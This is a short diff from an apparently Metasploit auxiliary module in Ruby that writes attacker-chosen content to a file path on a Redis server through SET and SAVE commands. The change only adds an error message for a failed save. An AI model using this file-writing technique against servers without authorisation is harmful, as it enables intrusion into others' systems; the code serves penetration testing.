@@ -76,8 +76,12 @@ class Metasploit3 < Msf::Auxiliary
     data = redis_command('SET', key, content)
     return unless data.include?('+OK')
     data = redis_command('SAVE')
-    return unless data.include?('+OK')
-    print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
+    if data.include?('+OK')
+      print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
+    else
+      print_error("#{peer} -- failed to save #{content.size} bytes to #{path} (permissions?)")
+      return
+    end
 
     # cleanup
     # XXX: ensure that these get sent if we prematurely return if a previous command fails
